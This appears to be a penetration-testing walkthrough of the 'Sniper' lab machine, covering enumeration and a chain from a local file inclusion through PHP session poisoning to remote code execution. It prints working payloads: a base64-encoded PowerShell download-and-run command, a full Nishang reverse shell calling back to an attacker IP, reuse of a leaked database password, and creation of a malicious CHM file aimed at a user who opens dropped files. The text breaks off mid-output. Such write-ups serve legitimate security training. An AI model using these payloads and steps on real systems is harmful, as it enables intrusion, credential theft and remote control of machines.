---
Primary_category: "[[MEDIUM]]"
title: "SNIPER"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags: 
cssclasses:
---

###### PRIMARY CATEGORY → [[MEDIUM]]

#### Summary

- ***Summary A***
- ***Summary B***
- ***Summary C***
- ***Summary D***
- ***Summary E***

![[SNIPER-20250322202150041.webp|400]]

---

#### Setup

Directory creation with the Machine's Name

```bash
mkdir Sniper && cd !$
```

Creation of a *Pentesting Folder Structure* to store all the information related to the target

> ***[[ZSH CUSTOM FUNCTIONS#mkt|Reference]]***

```bash
mkt
```

> [!IMPORTANT]- *Tree*
>
> ```bash
> .
> ├── evidence
> │   ├── creds
> │   ├── data
> │   └── screenshots
> ├── logs
> ├── scans
> ├── scope
> └── tools
> ```
>

---

#### Recon

##### *OS Identification*

First, proceed to identify the *Target Operative System*. This can be done by a simple `ping` taking into account the *TTL Unit*

The standard values are →

- ***About 64 → Linux***
- ***About 128 → Windows***

```bash
ping -c1 Sniper
```

> [!NOTE]- *Command Output*
>
> ```bash
> PING 10.129.229.6 (10.129.229.6) 56(84) bytes of data.
> 64 bytes from 10.129.229.6: icmp_seq=1 ttl=127 time=41.4 ms
> 
> --- 10.129.229.6 ping statistics ---
> 1 packets transmitted, 1 received, 0% packet loss, time 0ms
> rtt min/avg/max/mdev = 41.375/41.375/41.375/0.000 ms
> ```
>

As mentioned, according to the TTL, It seems that It is a ***Windows Target***

##### *Port Scanning*

###### *General Scan*

Let's run a *Nmap* Scan to check what *TCP* Ports are opened in the machine

The Scan result is exported in a grepable format for subsequent *Port Parsing*

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG allPorts 10.129.229.6
```

> [!BUG]- *AllPorts*
>
> ```bash
> # Nmap 7.94SVN scan initiated Thu Mar 20 08:58:23 2025 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG allPorts 10.129.229.6
> # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
> Host: 10.129.229.6 ()	Status: Up
> Host: 10.129.229.6 ()	Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 49667/open/tcp/////	Ignored State: filtered (65530)
> # Nmap done at Thu Mar 20 08:58:50 2025 -- 1 IP address (1 host up) scanned in 26.47 seconds
> ```
>

**Open Ports → 80, 135, 139, 445 and 49667**

###### *Comprehensive Scan*

The *[[ZSH CUSTOM FUNCTIONS#extractPorts|ExtractPorts]]* utility is used to get a **Readable Summary** of the previous scan and have ***all Open Ports copied to the clipboard***

```bash
extractPorts allPorts
```

> [!BUG]- *ExtractPorts*
>
> ```bash
> [+] Extracting information...
> 
>     [+] IP Address: 10.129.229.6
>     [+] Open Ports: 80,135,139,445,49667
> 
> [+] Ports Copied to Clipboard
> ```
>

Then, the ***Comprehensive Scan*** is performed to gather the ***Service and Version*** running on each open port and launch a set of ***Nmap Basic Recon Scripts***

Note that this scan is also exported to have evidence at hand

```bash
nmap -p80,135,139,445,49667 -sCV -n -Pn --disable-arp-ping -oN targeted 10.129.229.6
```

> [!BUG]- *Targeted*
>
> ```bash
> # Nmap 7.94SVN scan initiated Thu Mar 20 09:00:51 2025 as: nmap -p80,135,139,445,49667 -sCV -n -Pn --disable-arp-ping -oN targeted 10.129.229.6
> Nmap scan report for 10.129.229.6
> Host is up (0.13s latency).
> 
> PORT      STATE SERVICE       VERSION
> 80/tcp    open  http          Microsoft IIS httpd 10.0
> |_http-server-header: Microsoft-IIS/10.0
> |_http-title: Sniper Co.
> | http-methods: 
> |_  Potentially risky methods: TRACE
> 135/tcp   open  msrpc         Microsoft Windows RPC
> 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
> 445/tcp   open  microsoft-ds?
> 49667/tcp open  msrpc         Microsoft Windows RPC
> Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
> 
> Host script results:
> | smb2-time: 
> |   date: 2025-03-20T15:01:54
> |_  start_date: N/A
> | smb2-security-mode: 
> |   3:1:1: 
> |_    Message signing enabled but not required
> |_clock-skew: 7h00m03s
> 
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> # Nmap done at Thu Mar 20 09:02:27 2025 -- 1 IP address (1 host up) scanned in 96.38 seconds
> ```
>

##### *139, 445 - SMB*

###### *Basic Information Gathering*

Let's start with the *SMB port*, as always, we start gathering information about the *target* by using a tool such as `netexec`

With this tool we can extract some information such as the *host name*, the *domain* (if exists) and the *OS* and *SMB* versions

```bash
nxc smb 10.129.229.6
```

> [!NOTE]- *Command Output*
>
> ```bash
> SMB                      10.129.229.6  445    SNIPER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SNIPER) (domain:Sniper) (signing:False) (SMBv1:False)
> ```
>

So, we know that the host may be a *Windows 10* o *Server 2019*, and its name

We can add its name to the `/etc/hosts` file

```bash
printf "10.129.229.6\tsniper" >> /etc/hosts
```

> [!BUG]- */etc/hosts*
>
> ```bash
> # Host addresses
> 127.0.0.1  localhost
> 127.0.1.1  parrot
> ::1        localhost ip6-localhost ip6-loopback
> ff02::1    ip6-allnodes
> ff02::2    ip6-allrouters
> # Others
> 10.129.229.6	sniper
> 
> ```
>

###### *Listing of Shares*

We can try to list the shares on the target, as we do not have any valid credentials, let's check with *Null Authentication*

```bash
nxc smb sniper --username '' --password '' --shares
```

> [!NOTE]- *Command Output*
>
> ```bash
> SMB         10.129.229.6  445    SNIPER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SNIPER) (domain:Sniper) (signing:False) (SMBv1:False)
> SMB         10.129.229.6  445    SNIPER           [-] Sniper\: STATUS_ACCESS_DENIED 
> SMB         10.129.229.6  445    SNIPER           [-] Error getting user: list index out of range
> SMB         10.129.229.6  445    SNIPER           [-] Error enumerating shares: Error occurs while reading from remote(104)
> ```
>

But we get an *Access Denied Error*

We can check if the *guest* account is enabled

```bash
nxc smb sniper --username 'guest' --password '' --shares
```

> [!NOTE]- *Command Output*
>
> ```bash
> SMB         10.129.229.6  445    SNIPER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SNIPER) (domain:Sniper) (signing:False) (SMBv1:False)
> SMB         10.129.229.6  445    SNIPER           [-] Sniper\guest: STATUS_ACCOUNT_DISABLED 
> ```
>

The *Guest* system account is disabled in this case

Finally, we could test with a random username to see how the *target* responds

```bash
nxc smb sniper --username 'anyRandomUsername' --password '' --shares
```

> [!NOTE]- *Command Output*
>
> ```bash
> SMB         10.129.229.6  445    SNIPER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SNIPER) (domain:Sniper) (signing:False) (SMBv1:False)
> SMB         10.129.229.6  445    SNIPER           [-] Sniper\anyRandomUsername: STATUS_LOGON_FAILURE 
> ```
>

We get *Logon Failure Error* as the user does not exist in the system

At this point, there is not much we can do here, let's move on to another port

##### *135 - RCP*

We could use the `rpcclient` tool to try to authenticate to any *RCP Endpoint* via *RCP Dynamic Ports* or *Namedpipes*

Since we do not have got anything in *SMB*, we probably will not get anything here either, but, let's give it a try

- ***Null Authentication***

```bash
rpcclient --user '' --no-pass --command 'srvinfo' sniper
```

> [!NOTE]- *Command Output*
>
> ```bash
> Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
> ```
>

- ***Authentication with Guest Account***

```bash
rpcclient --user 'guest%' --command 'srvinfo' sniper
```

> [!NOTE]- *Command Output*
>
> ```bash
> Cannot connect to server.  Error was NT_STATUS_ACCOUNT_DISABLED
> ```
>

- ***Authentication with a Random User***

```bash
rpcclient --user 'anyRandomUser%' --command 'srvinfo' sniper
```

> [!NOTE]- *Command Output*
>
> ```bash
> Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
> ```
>

Same as *SMB*, so, it seems that the *Entry Vector* is on *port 80*
	
> [!IMPORTANT]-
>
> Remember that we can also list *UPD Ports* to see if there any open
>

##### *80 - HTTP*

###### *Banner Grabbing*

Let's start listing the *Web Server and its Version*

```bash
curl --silent --location --request GET --head 'http://10.129.229.6'
```

> [!NOTE]- *Command Output*
>
> ```bash
> HTTP/1.1 200 OK
> Content-Type: text/html; charset=UTF-8
> Server: Microsoft-IIS/10.0
> X-Powered-By: PHP/7.3.1
> Date: Thu, 20 Mar 2025 15:34:00 GMT
> Content-Length: 2635
> ```
>

And we know that the *Web Server* is an *IIS* and the *Server-Side Language Programming* is *PHP*, instead of *.NET (aspx)* or *Java (jsp)*

###### *Web Technologies*

We use `whatweb` to extract more information about the *target* and the *Web Technologies* it uses

```bash
whatweb http://10.129.229.6
```

> [!NOTE]- *Command Output*
>
> ```bash
> http://10.129.229.6 [200 OK] Bootstrap[3.0.0], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.229.6], JQuery[2.1.3], Microsoft-IIS[10.0], PHP[7.3.1], Script, Title[Sniper Co.], X-Powered-By[PHP/7.3.1]
> ```
>

Nothing new or interesting here, so let's access to the *Web* from the browser

###### *Browser-Based Inspection*

Let's see what the *Wappalyzer Addon* reports

![[SNIPER-20250320094055722.webp|300]]

Same as *Whatweb*

There is nothing interesting in the source code of the *Web's Home Page*

We can check if this *Website* is running using *PHP* by requesting an *index.php*, which will probably be the current *page*

![[SNIPER-20250320094435643.webp|450]]

And it is

Before proceeding with any *fuzzing*, let's try to list the all the content of this *website* and check its functionalities

To do this, we will create a project in ***[caido](https://caido.io/)*** to track all the *HTTP Requests* sent and check if there are any interesting *entry points*

There are two interesting *sections*

- **`http://10.129.229.6/blog`**

![[SNIPER-20250320095453887.webp|450]]

The *Download Section* is static and has nothing

But there is something interesting if we select a *language* in the *Language Section*

![[SNIPER-20250320095652454.webp|300]]

There is a *lang URL Parameter* processed by the *index.php* of the *Blog Page*

The current value of the above parameter makes me think that an *include* or *include_once php function* may be used in the *index.php* script

If the processing of the *lang* parameter is not being properly sanitised, it could be leveraged to perform a *Local File Inclusion (LFI)*

- **`http://10.129.229.6/user`**

![[SNIPER-20250320095247838.webp|450]]

It redirects us to a *login.php*

We have an option to *sign up*, and it takes us to a *registration.php*

So we can create an account and see what happens if we log in with this account

> [!IMPORTANT]-
>
> Note that all *HTTP Traffic* generated by the *browser* is being passed to *caido*, so later we can check all *HTTP request* and look for the interesting ones such as the possible *LFI* or these *login* and *registration* functions
>

- ***Registration.php***

![[SNIPER-20250320102757457.webp|400]]

After log in with the above credentials, we are redirected to the following page

![[SNIPER-20250320103030524.webp|300]]

We are logged in and a *Session Cookie* has been set, but we don't seem to be able to do anything

![[SNIPER-20250320103323487.webp|450]]

Note that, the *PHP directive* `session.save_path` indicates where *PHP Session Cookies* are stored on the *system*

If no value is set to the above parameter, the default path on *Windows machines* is `%TEMP%` i.e. `\Windows\TEMP`

The conventional name for each cookie is usually `sess_<COOKIE_VALUE>`

---

#### Exploitation

##### *LFI to RCE via PHP Session Cookies*

So, let's check if there is a potential *Local File Inclusion* in the *Lang URL parameter* of the *Blog page*

First, we try with a basic *Directory Path Traversal*

![[SNIPER-20250320104726310.webp|450]]

But it does not work

The *PHP* script may uses a *PHP function* such as *preg_replace* or *str_replace* to delete any pattern related to *`../`* or *`..\`*, so we can try the following one

![[SNIPER-20250320105029249.webp|450]]

But we got nothing either

Before proceed with more complex bypasses, there are situations where it is sufficient to provide the *Full Path* of the included file, without any *Traversal Path*

![[SNIPER-20250320105348879.webp|450]]

And here we go! We have a *Local File Inclusion*

Once we have exploited this type of *Web Vuln*, the first thing we can start to think about is how we can leverage this to get *Command Execution*

On *Linux* system we could think about *Log Poisoning* if the *user* running the *web server* has read permissions on the *Web Logs*

We can also *fuzz* the web server to discover more content such as other *PHP* scripts, as one of them may has *hardcoded* credentials or *juicy comments* on it

So we could use a *PHP Wrapper*, like the *base64-encoded one*, to get the content of those *PHP scripts* and *base64-decode them* to inspect them one by one

But, once again, before perform *fuzzing*, let's try to get the content of the file related to the current *PHP Session Cookie*

Remember that we said that the default path is `%TEMP%` if the *PHP directive* `session.save_path` has not been modified in the *php.ini* file

- ***PHP Session ID Value → `kqipkvhcdi5curbvlihnm89asn`***

![[SNIPER-20250320110654092.webp|450]]

![[SNIPER-20250320110733213.webp|450]]

We can see that the *username* appears on it

Since the username is a value that we can control from our side, we could try to create a user with the following name →

```php
<?php echo shell_exec("whoami"); ?>
```

![[SNIPER-20250320111247449.webp|450]]

If we try to log in with that user, we get an *Error Message*

![[SNIPER-20250320111425387.webp|450]]

It seems that the above user could not be registered

It may be some kind of *character blacklist*, like *bad chars* or something like that to prevent some kind of injection, such as *SQL Injection* or *Command Injection*, depending on the context

We could create a *python script* to check which characters are blacklisted by performing a *registration → login* action by creating a user whose name contains the given character we are testing for

Thus, we can create a valid payload as the *username* in order to get *Command Execution* in the *target*

> ***[[#Bad Chars Checker in User Registration URL|Python Script]]***

```bash
python3 -m venv .venv
source !$/bin/activate
```

```bash
pip3 install pwn colorama
```

```bash
python3 script.py http://10.129.229.6/user/registration.php http://10.129.229.6/user/login.php
```

![[bad_chars_script.gif|450]]

> ***Zoom In***

> [!NOTE]- *Command Output*
>
> ```bash
> [+] Bad Chars 🐉: "$&(-.;[_
> ```
>

- ***Bad Chars → "$&(-.;\[_***

Note that the *opening parentheses* is blacklisted, so we cannot use any *PHP Function* in the conventional way

However, there is another way to execute commands using the `shell_exec()` function in *PHP*

```php
<?=`<COMMAND>`?> 
```

The above code is the same as 

```php
<?php echo shell_exec("<COMMAND>"); ?>
```

- **`=`** → **`echo`**
- ***backticks*** → **`shell_exec()`**

Following this way, we could craft this payload →

```php
<?=`powershell /enc <BASE64_PAYLOAD>`?>
```

In this case, the `EncodedCommand` *powershell's argument* allows us to avoid using most of the blacklisted characters

The payload could be a *Fileless* vector which send an *HTTP Request* using *Invoke-WebRequest* and execute the *HTTP's Body Response* via *Invoke-Expression*

The requested resource would be this ***[Nishang Rev TCP Oneliner](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)***

```bash
IEX (IWR -UseBasicParsing -Uri http://10.10.16.30:8888/rev.ps1)
```

Note that before *base64 encoding* the above payload, it must be converted to the *UTF-16LE* encoding, which is used by *Windows*

Thefore, proceed as follows →

- ***Download and Modify the Nishang Reverse TCP Shell***

```bash
curl --silent --location --request GET "https://github.com/samratashok/nishang/raw/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1" --output rev.ps1
```

```bash
nvim !$
```

> [!BUG]- *rev.ps1*
>
> ```bash
> $client = New-Object System.Net.Sockets.TCPClient('10.10.16.30',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
> ```
>

- ***Build a Simple HTTP Server***

```bash
python3 -m http.server 8888
```

- ***Craft the Payload as follows***

```bash
echo -n "IEX (IWR -UseBasicParsing -Uri http://10.10.16.30:8888/rev.ps1)" | iconv --to-code UTF-16LE | base64 -w 0 ; echo
```

> [!NOTE]- *Command Output*
> 
> ```bash
> SQBFAFgAIAAoAEkAVwBSACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIABoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADMAMAA6ADgAOAA4ADgALwByAGUAdgAuAHAAcwAxACkA
> ```
>

So, the username would be the following →

```php
<?=`powershell /enc SQBFAFgAIAAoAEkAVwBSACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIABoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADMAMAA6ADgAOAA4ADgALwByAGUAdgAuAHAAcwAxACkA`?>
```

- ***Set up a TCP Listener Socket using the IP and Port specified in `rev.ps1`***

```bash
rlwrap -CaR nc -nlvp 4444
```

- ***User Registration***

![[SNIPER-20250320192554754.webp|450]]

- ***User Login***

![[SNIPER-20250320192628696.webp|450]]

Once we are logged in with the created user, just grab the value of the generated *PHP Session Cookie* and use the discovered *LFI* to load the content of the following file → `sess_<COOKIE_VALUE>`

Then, *PHP* code will be executed and we will obtain the *reverse shell*

Therefore, proceed as follows

- ***Extraction of the PHP Session Cookie's value***

![[SNIPER-20250320193016989.webp|450]]

- ***Show the Content of the file associated with the above cookie through the LFI***

![[SNIPER-20250320193233762.webp|450]]

And we got the connection back!

> [!NOTE]- *Simple HTTP Server Output*
>
> ```bash
> Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
> 10.129.229.6 - - [20/Mar/2025 19:32:06] "GET /rev.ps1 HTTP/1.1" 200 -
> ```
>

> [!NOTE]- *RLWrap + Netcat Output*
>
> ```bash
> listening on [any] 4444 ...
> connect to [10.10.16.30] from (UNKNOWN) [10.129.229.6] 49702
> 
> PS C:\inetpub\wwwroot\blog> 
> ```
>

```bash
whoami
```

> [!NOTE]- *Command Output*
>
> ```bash
> nt authority\iusr
> ```
>

We are in the system as *nt authority\iusr*

---

#### Privesc #1

***Initial Non-Privileged User → nt authority\iusr***

##### *Information Leakage on PHP DB Connection Script*

We check if the current user belongs to any privileged group or has any privileges assigned to him that could result in a potential *privesc*

```bash
whoami
```

> [!NOTE]- *Command Output*
>
> ```bash
> USER INFORMATION
> 
> User Name         SID     
> ================= ========
> nt authority\iusr S-1-5-17
> 
> 
> GROUP INFORMATION
> 
> Group Name                           Type             SID          Attributes                                        
> ==================================== ================ ============ ==================================================
> Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
> Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
> BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
> NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Group used for deny only                          
> CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
> NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
> NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
> LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
> 
> 
> PRIVILEGES INFORMATION
> 
> Privilege Name          Description                               State  
> ======================= ========================================= =======
> SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
> SeImpersonatePrivilege  Impersonate a client after authentication Enabled
> SeCreateGlobalPrivilege Create global objects                     Enabled
> ```
>

The only interesting thing that could lead us to a potential *privesc* to *NT Authority \System* would be the privilege ***SeimpersonatePrivilege***

But, before exploit it, let's inspect the files inside the *web root directory*

```bash
dir C:\inetpub\wwwroot\user
```

> [!NOTE]- *Command Output*
>
> ```bash
>     Directory: C:\inetpub\wwwroot\user
> 
> Mode                LastWriteTime         Length Name                                                                  
> d-----        4/11/2019   5:52 AM                css                                                                   
> d-----        4/11/2019   5:23 AM                fonts                                                                 
> d-----        4/11/2019   5:23 AM                images                                                                
> d-----        4/11/2019   5:23 AM                js                                                                    
> d-----        4/11/2019   5:23 AM                vendor                                                                
> -a----        4/11/2019   5:15 PM            108 auth.php                                                              
> -a----        4/11/2019  10:51 AM            337 db.php                                                                
> -a----        4/11/2019   6:18 AM           4639 index.php                                                             
> -a----        4/11/2019   6:10 AM           6463 login.php                                                             
> -a----         4/8/2019  11:04 PM            148 logout.php                                                            
> -a----        10/1/2019   8:42 AM           7192 registration.php                                                      
> -a----        8/14/2019  10:35 PM           7004 registration_old123123123847.php                                      
> 
> ```
>

There is an interesting file that might have hardcoded credentials as it seems to be a  *PHP Script* related to a *Database Connection*

```bash
Get-Content C:\inetpub\wwwroot\user\db.php
```

> [!BUG]- *db.php*
>
> ```php
> <?php
> // Enter your Host, username, password, database below.
> // I left password empty because i do not set password on localhost.
> $con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
> // Check connection
> if (mysqli_connect_errno())
>   {
>   echo "Failed to connect to MySQL: " . mysqli_connect_error();
>   }
> ?>
>  ```
>

And yes, there are

Since the specified *database connection* is a *MySQL* one and the *TCP Port 3306* related to the *MariaDB/MySQL* service is not externally accessible, let's check if the service is running locally on the *target*

```bash
Get-NetTCPConnection -State Listen | Where-Object { $_.LocalPort -eq 3306 }
```

> [!NOTE]- *Command Output*
>
> ```bash
> LocalAddress                        LocalPort RemoteAddress                       RemotePort State       AppliedSetting
> ------------                        --------- -------------                       ---------- -----       --------------
> ::                                  3306      ::                                  0          Listen                    
> ```
>

And it is! So, we could use ***[chisel](https://github.com/jpillora/chisel)*** to set up *Remote Port Forwarding* and be able to access, from our machine, *port 3306* of the *target*

Then, we could use the *MySQL CLI Client*  to connect to the hardcoded *database* and see what tables exist in it

But, before proceed with that, let's check what users are in the system, reuse of credentials may have been applied in this case

```bash
net user
```

> [!NOTE]- *Command Output*
>
> ```bash
> User accounts for \\
> 
> -------------------------------------------------------------------------------
> Administrator            Chris                    DefaultAccount           
> Guest                    WDAGUtilityAccount       
> ```
>

We check with `netexec` if the *hardcoded db credential* is valid for the user *Chris*

```bash
nxc smb sniper --username 'chris' --password '36mEAhz/B8xQ~2VM'
```

> [!NOTE]- *Command Output*
>
> ```bash
> SMB         10.129.229.6    445    SNIPER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SNIPER) (domain:Sniper) (signing:False) (SMBv1:False)
> SMB         10.129.229.6    445    SNIPER           [+] Sniper\chris:36mEAhz/B8xQ~2VM 
> ```
>

And it is! 

```bash
net user Chris
```

> [!NOTE]- *Command Output*
>
> ```bash
> User name                    Chris
> Full Name                    
> Comment                      
> User's comment               
> Country/region code          000 (System Default)
> Account active               Yes
> Account expires              Never
> 
> Password last set            4/11/2019 6:53:37 AM
> Password expires             Never
> Password changeable          4/11/2019 6:53:37 AM
> Password required            Yes
> User may change password     Yes
> 
> Workstations allowed         All
> Logon script                 
> User profile                 
> Home directory               
> Last logon                   3/21/2025 4:00:40 PM
> 
> Logon hours allowed          All
> 
> Local Group Memberships      *Remote Management Use*Users                
> Global Group memberships     *None                 
> The command completed successfully.
> ```
>

Furthermore, the user *Chris* belongs to the *Remote Management Users* builtin group, which means that we can connect to the *target* via the *WinRM* protocol

Remember that the *port 5985* is not externally accessible either, so we could use *chisel*, as mentioned before, to be able to access this port from the  *attacker*

Then, use a tool like ***[EvilWinRM](https://github.com/Hackplayers/evil-winrm)*** to connect to the *remote machine* via the above protocol

However, there are different ways to be able to execute commands on the system as another user by having valid credentials for that specific user

First, we need to create the *Credential Object* in order to authenticate with the user *Chris*

```bash
$user = 'sniper\chris'
$password = ConvertTo-SecureString -String '36mEAhz/B8xQ~2VM' -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user,$password
```

Then, we can proceed using `Invoke-Command` and `Script-Block` as follows

```bash
Invoke-Command -ComputerName SNIPER -Credential $credential -ScriptBlock { whoami }
```

> [!NOTE]- *Command Output*
>
> ```bash
> sniper\chris
> ```
>

As we are sharing the *rev.ps1* resource through the *Simple HTTP Server* with *python*, let's request this resource as the user *Chris* to gain access to the system as him

- ***Craft the Payload***

```bash
echo -n "IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.30:8888/rev.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
```

- ***Set up a Listening Socket using the Port specified in the Reverse Shell Script***

```bash
rlwrap -CaR nc -nlvp 4444
```

- ***Run the Command through Invoke-Command + ScriptBlock as Chris***

```bash
Invoke-Command -ComputerName SNIPER -Credential $credential -ScriptBlock { powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMwAwADoAOAA4ADgAOAAvAHIAZQB2AC4AcABzADEAJwApAA== }
```

> [!NOTE]- *Simple HTTP Server Output*
>
> ```bash
> Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
> 10.129.229.6 - - [22/Mar/2025 17:50:37] "GET /rev.ps1 HTTP/1.1" 200 -
> ```
>

> [!NOTE]- *RLWrap Output*
>
> ```bash
> listening on [any] 4444 ...
> connect to [10.10.16.30] from (UNKNOWN) [10.129.229.6] 49706
>
> PS C:\Users\Chris\Documents> whoami
> sniper\chris
> PS C:\Users\Chris\Documents> 
> ```
>

And we are in as *Chris*!

Therefore, we can grab the *user.txt* flag

```bash
Get-Content C:\Users\Chris\Desktop\user.txt
```

#### Privesc #2

***Non-Privileged User → Chris***

##### *Command Execution via CHM File*

As we have seen above, the user *Chris* does not belong to any interesting group for which we could obtain any kind of *privesc*

We can list the privileges set for the current user to see if any could lead to *administrator privileges*

```bash
whoami /priv
```

> [!NOTE]- *Command Output*
>
> ```bash
> PRIVILEGES INFORMATION
> 
> Privilege Name                Description                    State  
> ============================= ============================== =======
> SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
> SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
> ```
>

Nothing interesting here

If we list the existent files in the *root* directory, we see an interesting folder → ***Docs***

```bash
dir C:\
```

> [!NOTE]- *Command Output*
>
> ```bash
>     Directory: C:\ 
>  
> Mode                LastWriteTime         Length Name                                               
> d-----        10/1/2019   1:04 PM                Docs                                               
> d-----         4/9/2019   7:07 AM                inetpub                                            
> d-----        4/11/2019   6:44 AM                Microsoft                                          
> d-----        9/15/2018  12:19 AM                PerfLogs                                           
> d-r---        4/29/2022   1:18 PM                Program Files                                      
> d-----        8/14/2019  10:38 PM                Program Files (x86)                                
> d-r---        4/11/2019   7:04 AM                Users                                              
> d-----        4/29/2022   1:19 PM                Windows         
> ```
>

There are two files inside the above directory, the interesting one is called *note.txt*, which has the following content

```bash
Get-Content C:\Docs\note.txt
```

> [!NOTE]- *Command Output*
>
> ```bash
> Hi Chris,
> Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.
> 
> Regards,
> Sniper CEO.
> ```
>

Judging by the note, It seems that the *Sniper CEO* is periodically inspecting the *Docs* directory to see if someone is dropping some kind of file

We could think about creating a *.SCF* file that loads its icon from a remote *SMB Server* and allows an attacker to intercept the *NTLMv2 hash* of the user accessing the directory containing that malicious file

But, before proceed with that, if we inspect *Chris's home directory* recursively, there is an interesting file in *Downloads*

```bash
dir -Recurse -Path C:\Users\Chris
```

> [!NOTE]- *Command Output*
>
> ```bash
>     Directory: C:\Users\Chris
> 
> 
> Mode                LastWriteTime         Length Name                                              
> ----                -------------         ------ ----                                              
> d-r---        4/11/2019   7:04 AM                3D Objects                                        
> d-r---        4/11/2019   7:04 AM                Contacts                                          
> d-r---        4/11/2019   8:15 AM                Desktop                                           
> d-r---        4/11/2019   7:04 AM                Documents                                         
> d-r---        4/11/2019   8:36 AM                Downloads                                         
> d-r---        4/11/2019   7:04 AM                Favorites                                         
> d-r---        4/11/2019   7:04 AM                Links                                             
> d-r---        4/11/2019   7:04 AM                Music                                             
> d-r---        4/11/2019   7:04 AM                Pictures                                          
> d-r---        4/11/2019   7:04 AM                Saved Games                                       
> d-r---        4/11/2019   7:04 AM                Searches                                          
> d-r---        4/11/2019   7:04 AM                Videos                                            
> 
> 
>     Directory: C:\Users\Chris\Desktop
> 
> 
> Mode                LastWriteTime         Length Name                                              
> ----                -------------         ------ ----                                              
> -ar---        3/22/2025   4:01 PM             34 user.txt                                          
> 
> 
>     Directory: C:\Users\Chris\Downloads
> 
> 
> Mode                LastWriteTime         Length Name                                              
> ----                -------------         ------ ----                                              
> -a----        4/11/2019   8:36 AM          10462 instructions.chm                                  
> 
> 
>     Directory: C:\Users\Chris\Favorites
> 
> 
> Mode                LastWriteTime         Length Name                                              
> ```
> 

A *Compiled HTLM File Format (.CHM)*, which is most commonly used by *Microsoft's HTML-based Help Program*

Since the file is called *instructions.chm*, we might think that this is the file *Chris* will share with *Sniper's CEO*, leaving it in the *Docs* directory

So, we could create a malicious *.CHM* file from the attacker that will run a command when someone opens that file, and leave that file in the above directory

We can use the ***[Out-CHM](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1)*** *powershell script* from *Nishang* to create a malicious *.CHM* file

First, we have to check that the *hhc.exe (HTML Help Workshop)* executable is on the system

Then, proceed as follows to create the *.CHM file*

- ***Download Powershell Out-CHM Script and Import all functions declared in it into the current Powershell Session***

```bash
IEX (Invoke-RestMethod -UseBasicParsing -Uri 'https://github.com/samratashok/nishang/raw/refs/heads/master/Client/Out-CHM.ps1')
```

- ***Create the .CHM File***

To check if it works, just create a *.CHM* which sends an *ICMP packet* when is opened

```bash
Out-CHM -Payload "ping -n 1 10.10.16.30" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

> [!NOTE]- *Command Output*
>
> ```bash
> Microsoft HTML Help Compiler 4.74.8702
> 
> Compiling c:\Users\Alejandro\doc.chm
> 
> Compile time: 0 minutes, 0 seconds
> 2       Topics
> 4       Local links
> 4       Internet links
> 0       Graphics
> 
> 
> Created c:\Users\Alejandro\doc.chm, 13,426 bytes
